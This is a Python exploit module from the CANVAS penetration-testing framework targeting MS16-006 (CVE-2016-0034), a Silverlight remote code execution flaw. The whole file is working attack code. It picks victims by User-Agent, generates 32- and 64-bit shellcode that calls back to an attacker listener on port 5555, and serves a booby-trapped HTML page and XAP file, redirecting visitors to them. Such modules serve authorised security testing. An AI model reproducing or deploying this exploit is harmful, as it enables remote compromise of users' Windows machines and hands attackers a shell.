#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import zlib
import re

from shellcode import shellcodeGenerator

from Crypto.Cipher import XOR
from httpclientside import httpclientside
from libs.spkproxy import header, body
from libs.ua_parser import user_agent_parser
from shellcode.standalone.windows import payloads64

from exploitutils import *
from tcpexploit import *
import canvasengine

import base64

NAME                              = 'ms16_006_silverlight'
DESCRIPTION                       = 'MS16-006 - Microsoft Silverlight Remote Code Execution'
DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = 'Microsoft'
DOCUMENTATION['Date public']      = '01/12/2016'
DOCUMENTATION['References']       = ['https://technet.microsoft.com/en-us/library/security/ms16-006.aspx']
DOCUMENTATION['VersionsAffected'] = 'Previous to 5.1.41212.0 are affected'
DOCUMENTATION['CVE Name']         = 'CVE-2016-0034'
DOCUMENTATION['CVE Url']          = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0034'
DOCUMENTATION['Notes']            = """

This module exploits a mishandling of negative offsets during a decoding. This 
situation could be exploited to overwrite with controlled data any position 
prior to the buffer. In this case, an array's length will be corrupted to 
obtain an arbitrary memory read/write primitive.

The class responsable for returning negative offsets is a custom one, inherited 
from Decoder. The vulnerable code could be reached by calling the Read method
of a BinaryReader object.

Tested on:
Windows 7 Ultimate SP1 x32 with IE11 32 bits (Silverlight 5.1.30514.0 32-bit)
Windows 7 Professional SP1 x64 with IE11 64 bits (Silverlight 5.1.30514.0 64-bit)

Notes:
The browser may displays a message informing that a new version of Silverlight 
is available, in this case is required that the user press the "Run this time"
button to get the exploit executed.

When targeting a 64-bit browser first of all create a new 'WIN64 MOSDEF INTEL' 
listener at 5555 port.
"""

VERSION                           = '1.0'
PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['DELIVERY']              = 'HTTP'
CHANGELOG                         = """
"""


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version         = 0
        self.name            = NAME
        self.filename        = "%s.html" % randomstring(8)
        self.xapfilename     = 'App'
        self.plugin_info     = None # we want clientd to give us a plugin dict
        self.refresh_rate    = 30
        self.xorer           = XOR.new("\x5a")
        self.badstring       = '\x00'


    def createShellcode(self, x64=False):
        if x64:
            p = payloads64.payloads()

            heading = """
                push %rbp
                movq %rsp, %rbp
                push %r10
                push %r11
                push %r12
                push %r13
                push %r14
                push %r15
                push %rdi
                push %rsi
                push %rbx
            """
            ending = """
                add $0x300, %rsp
                pop %rbx
                pop %rsi
                pop %rdi
                pop %r15
                pop %r14
                pop %r13
                pop %r12
                pop %r11
                pop %r10
                pop %rbp
                ret

            """

            asm = p.InjectToSelf(self.callback.ip, 5555, heading, ending)
            self.shellcode = p.assemble(asm)
        else:
            self.shellcode = self.createWin32ClientSideShellcode(win8_compatible=True)


    def makefile(self):
        filedata='''<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" >
<!-- saved from url=(0014)about:internet -->
<head>
    <title>Blank Page</title>
</head>
<body>
    <form id="form1" runat="server" style="height:100%">
    <input id="payload" type="hidden" value="PAYLOAD_B64" />
    <div id="silverlightControlHost">
        <object data="data:application/x-silverlight-2," type="application/x-silverlight-2" width="100%" height="100%">
		  <param name="source" value="App.xap"/>
		  <param name="background" value="white" />
		  <param name="minRuntimeVersion" value="4.0.50826.0" />
		  <param name="autoUpgrade" value="true" />
	    </object><iframe id="_sl_historyFrame" style="visibility:hidden;height:0px;width:0px;border:0px"></iframe></div>
    </form>
</body>
</html>'''
        filedata = filedata.replace('PAYLOAD_B64', base64.b64encode(self.shellcode))
        return filedata


    def makeXAP(self):
        with open(os.path.join(os.path.dirname(__file__), 'Resources', self.xapfilename + '.xap'), 'rb') as f:
            return f.read()


    def makesploit(self, clientheader, clientbody):
        h = header('SERVER')
        b = body()

        # if there is no info about plugins, at least we can filter using
        # the user-agent making sure target is Windows
        useragent = clientheader.getStrValue(['User-Agent'])
        if "windows" in useragent.lower():
            if 'win64' in useragent.lower():
                self.createShellcode(True)
            else:
                self.createShellcode(False)
        else:
            self.log_error("Bailing on this client as it is not likely to be vulnerable")
            return None, None


        if self.xapfilename in clientheader.URL:
            self.log_info('Serving XAP file')
            b.setBody(self.makeXAP())
            h.addHeader('Content-Type', 'application/x-silverlight-app')
        elif self.filename in clientheader.URL:
            self.log_info('Serving HTML file')
            sploitstring = self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type', 'text/html')
        else:           
            self.log_info('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'text/html')

        return h, b


    def run(self):
        # Build the html that triggers the vulnerability
        filedata = self.makefile()
        self.log_info('Opening %s for output' % self.filename)
        fd=file(self.filename, 'wb+')
        fd.write(filedata)
        fd.close()
        self.log_info('Wrote exploit HTML to %s' % self.filename)

        return 1


if __name__ == '__main__':
    print 'Running CANVAS %s Exploit v %s' % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0, 1, None]:
        ret.interact()
